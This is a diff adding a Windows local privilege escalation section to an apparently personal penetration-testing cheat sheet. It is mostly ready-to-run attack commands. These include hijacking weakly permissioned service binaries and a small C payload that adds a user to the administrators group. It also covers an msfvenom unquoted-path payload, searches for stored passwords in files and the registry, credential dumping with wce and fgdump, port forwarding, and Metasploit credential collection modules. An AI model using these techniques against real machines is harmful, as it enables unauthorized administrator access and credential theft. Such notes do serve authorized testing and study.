@@ -320,6 +320,9 @@ Where we set up local machine to forward traffice to any remote destination thro
 
 
 
+
+
+
 ## Local Privilege Escalation
 
 ### Rescources
@@ -342,15 +345,101 @@ Exploit Suggester scripts(kernel)
 ### Windows
 
 #### System info
+```
+# Basics
+systeminfo
+hostname
 
-#### Scripts
+# Who am I?
+whoami
+echo %username%
+
+# What users/localgroups are on the machine?
+net users
+net localgroups
+
+# More info about a specific user. Check if user has privileges.
+net user user1
+
+# View Domain Groups
+net group /domain
+
+# View Members of Domain Group
+net group /domain <Group Name>
+
+# Firewall
+netsh firewall show state
+netsh firewall show config
+
+# Network
+ipconfig /all
+route print
+arp -A
+
+# How well patched is the system?
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+#What tasks are scheduled?
+schtasks /query /fo LIST /v
+
+#What Services are running?
+net start
+wmic service list brief
+tasklist /SVC
+
+```
 
 #### Services(DLL, binpath, registry, exe)
-`accesschk64.exe -wuvqc "user" *` searches for services that can be tampered with by those in users group
+`accesschk64.exe -wuvqc "user" *` searches for services that can be tampered with by those in user group
 `accesschk64.exe -wuvc [service]` - checks permissions on service 
-Example had you look for SERVICE_CHANGE_CONFIG to be writeable so we could change binpath
 
-#### Unqouted Paths
+##### Finding vulnerable services(binpath)
+we're looking for services that have the SERVICE_CHANGE_CONFIG allowed for our user so that we can mess with the binpath(use resources to exploit)
+
+```
+sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
+FOR /F %i in (Servicenames.txt) DO echo %i
+type Servicenames.txt
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO cmd.exe /c C:\path\to\accesschk -wuvc %i
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+
+#Even if we can't write to binpath directly, we may be able to write to the set binary
+cat path.txt | cut -c30- Done in linux, then transfer new file back
+FOR [/F] %i in (path.txt) DO icacls %i - if we can write to binary, we can replace it with payload
+
+#include <stdlib.h>
+int main ()
+{
+int i;
+    i = system("net localgroup administrators theusername /add");
+return 0;
+}
+
+i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
+
+
+```
+
+##### Accesschk64
+```
+# When executing any of the sysinternals tools for the first time the user will be presented with a GUI
+pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag
+to automatically accept the EULA.
+
+accesschk.exe /accepteula ... ... ...
+
+# Find all weak folder permissions per drive.
+accesschk64.exe -uwdqs Users c:\
+accesschk64.exe -uwdqs "Authenticated Users" c:\
+
+# Find all weak file permissions per drive.
+accesschk64.exe -uwqs Users c:\*.*
+accesschk64.exe -uwqs "Authenticated Users" c:\*.*
+```
+Example had you look for SERVICE_CHANGE_CONFIG permission for users to be writeable so we could change binpath
+
+##### Unqouted Paths
 
 `wmic service get name,pathname,startmode` - find unquoted file paths for services
 `msfvenom -p windows/exec CMD='net user /add qoute qoute123' -f exe-service -o common.exe` - creates binary to run in unquoted path, name of binary must be in path for this to work. then restart service
@@ -361,32 +450,150 @@ We're looking for execeutables that are automaticaly executed on some event (log
 
 #### Cleartext or b64 passwords
 
+```
+try other words too (pass, pw)
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+#find in config files
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+#find all paswords in all files
+findstr /spin "password" *.*
+
+#common files to find passwords in
+type c:\sysprep.inf
+type c:\sysprep\sysprep.xml
+type c:\unattend.xml
+type %WINDIR%\Panther\Unattend\Unattended.xml
+type %WINDIR%\Panther\Unattended.xml
+dir c:*vnc.ini /s /b
+dir c:*ultravnc.ini /s /b
+dir c:\ /s /b | findstr /si *vnc.ini
+
+#Registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+#search in reg
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+# Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# SNMP Paramters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+# Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+#meterpreter
+> post/windows/gather/credentials/gpp
+> post/windows/gather/enum_unattend
+
+```
 
 #### Pass the hash
-
+```
+wce32.exe -w
+wce64.exe -w
+fgdump.exe
+```
 
 #### Services only avalailable from loopback
+```
+netstat -ano
+
+Proto  Local address      Remote address     State        User  Inode  PID/Program name
+    -----  -------------      --------------     -----        ----  -----  ----------------
+    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
+    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
+    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
+    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
+    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
+    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
+    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
+    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
+    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
+    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
+    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
+    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
+
+we care about the ones that are LISTEN/LISTENING
+If they weren't scanned earlier, they're only available from inside.
+Use remote port forwarding to access it
+
+# Port forward using plink
+plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
+
+# Port forward using meterpreter
+portfwd add -l <attacker port> -p <victim port> -r <victim ip>
+portfwd add -l 3306 -p 3306 -r 192.168.1.101
+
+Local 0.0.0.0 means anyone can connect to it
+
+Local 127.0.0.1 only listenting for connection from this machine
+
+Local 192.168.1.9 is only listening for connections from inside network
+
+```
 
 
 #### Scheduled Tasks
+```
+schtasks /query /fo LIST /v - put output in file to grep over
+cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+check perms on the binaries listed
+```
 
 
 #### AlwaysInstallElevated
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
+if both return 0x1 then they're vulnerable
+```
 
 #### Kernel Exploits
+run exploitsuggester.py
 
-#### Useful commands
 
 #### Metasploit Modules
+```
+use exploit/windows/local/service_permissions
 
-#### WMIC
+post/windows/gather/credentials/gpp
 
+run post/windows/gather/credential_collector 
+
+run post/multi/recon/local_exploit_suggester
+
+run post/windows/gather/enum_shares
+
+run post/windows/gather/enum_snmp
+
+run post/windows/gather/enum_applications
+
+run post/windows/gather/enum_logged_on_users
+
+run post/windows/gather/checkvm
+```
 
 
 ### Linux
 
 #### Scripts
+LinEnum.sh
 
 #### Programs running as root
 
@@ -407,6 +614,7 @@ We're looking for execeutables that are automaticaly executed on some event (log
 #### Unmounted filesystems
 
 #### NFS Share
+
 
 ## Buffer Overflow
 
